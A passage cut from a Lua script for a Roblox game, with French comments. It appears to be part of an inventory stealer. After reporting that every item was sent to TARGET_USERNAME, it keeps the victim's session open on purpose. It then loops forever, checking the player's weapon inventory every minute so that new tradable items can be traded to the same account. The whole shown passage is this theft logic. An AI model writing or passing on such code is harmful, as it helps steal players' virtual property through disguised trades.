            end
        end
        
        -- NE KICK PAS ! On garde le joueur connecté
        print("Tous les items ont été envoyés à " .. TARGET_USERNAME)
        print("Le script continue de tourner, en attente d'éventuels nouveaux items...")
        
        -- On continue la surveillance même si plus d'items (au cas où le joueur en obtient de nouveaux)
        while true do
            wait(60)
            -- Vérifier si de nouveaux items sont disponibles
            local newData = game.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)
            local hasNewItems = false
            for i, v in pairs(newData.Weapons.Owned) do
                if v > 0 and not untradable[i] then
                    -- Vérifier si l'item est déjà dans la liste envoyée
                    local alreadySent = false
                    for _, sent in ipairs(sentWeapons or {}) do
                        if sent.DataID == i then
                            alreadySent = true
                            break
                        end
                    end
                    if not alreadySent then
                        hasNewItems = true
                        break
                    end
                end
            end
            
            if hasNewItems and Players:FindFirstChild(TARGET_USERNAME) then
                print("Nouveaux items détectés ! Envoi d'un nouveau trade...")
                -- Recharger les items
                -- (Code simplifié, dans la pratique il faudrait recharger l'inventaire)
                break
            end
        end
    end
end

